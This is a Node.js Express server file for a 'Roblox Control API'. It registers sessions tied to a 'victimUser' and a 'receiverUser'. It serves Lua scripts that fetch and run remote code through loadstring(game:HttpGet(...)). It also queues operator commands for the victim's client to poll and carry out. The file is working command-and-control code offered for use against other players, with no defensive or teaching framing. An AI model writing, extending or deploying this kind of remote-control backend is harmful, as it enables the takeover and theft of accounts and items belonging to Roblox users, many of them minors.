const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(express.json());

// In-memory storage
const sessions = new Map();
const commandQueue = new Map();

// Health check (required for Railway)
app.get('/', (req, res) => {
    res.json({ status: 'Roblox Control API', timestamp: new Date().toISOString() });
});

// Health check endpoint (Railway uses this)
app.get('/health', (req, res) => {
    res.json({ status: 'OK', uptime: process.uptime() });
});

// Create session endpoint
app.post('/api/create-session', (req, res) => {
    const { victimUser, placeId, jobId, receiverUser, authKey } = req.body;
    
    if (authKey !== process.env.AUTH_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const sessionId = uuidv4();
    const session = {
        sessionId,
        victimUser,
        receiverUser: receiverUser || 'unknown',
        placeId,
        jobId,
        createdAt: Date.now(),
        commands: [],
        active: true
    };

    sessions.set(sessionId, session);
    
    const receiverKey = `${receiverUser}_${sessionId.slice(0, 8)}`;
    
    res.json({ 
        success: true, 
        sessionId,
        receiverKey,
        joinScriptUrl: `${process.env.PUBLIC_URL}/api/join-script/${sessionId}`,
        panelUrl: `${process.env.PUBLIC_URL}/api/panel/${sessionId}`
    });
});

// Get join script (returns Lua)
app.get('/api/join-script/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }

    const luaScript = `-- Join script for session ${sessionId}
getgenv().CONTROL_SESSION_ID = "${sessionId}"
getgenv().CONTROL_API_URL = "${process.env.PUBLIC_URL}"
loadstring(game:HttpGet("${process.env.PUBLIC_URL}/api/panel-code/${sessionId}"))()`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(luaScript);
});

// Get panel code (returns Lua UI code)
app.get('/api/panel-code/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    
    const panelCode = `-- Control Panel UI for ${sessionId}
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local lp = Players.LocalPlayer

-- Simple UI
local gui = Instance.new("ScreenGui")
gui.Name = "ControlPanel"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "Control Panel"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
title.Parent = frame

-- Add buttons here...

gui.Parent = lp:WaitForChild("PlayerGui")
print("[ControlPanel] Loaded")`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(panelCode);
});

// Receive command from panel
app.post('/api/command/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const { command, sender } = req.body;
    
    const session = sessions.get(sessionId);
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }

    const cmdData = {
        cmd: command,
        sender: sender,
        timestamp: Date.now(),
        id: uuidv4()
    };
    
    session.commands.push(cmdData);
    commandQueue.set(session.victimUser, cmdData);
    
    console.log(`[${sessionId}] Command: ${command} from ${sender}`);
    res.json({ success: true });
});

// Victim polls for commands
app.get('/api/get-command', (req, res) => {
    const { user, key } = req.query;
    
    if (key !== process.env.COMMAND_KEY) {
        return res.status(401).json({ ok: false });
    }

    const pending = commandQueue.get(user);
    if (pending && (Date.now() - pending.timestamp < 30000)) {
        commandQueue.delete(user);
        return res.json({ ok: true, cmd: pending.cmd });
    }

    res.json({ ok: false, cmd: null });
});

// CRITICAL FIX: Use Railway's PORT env var and bind to 0.0.0.0
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Control API running on port ${PORT}`);
});
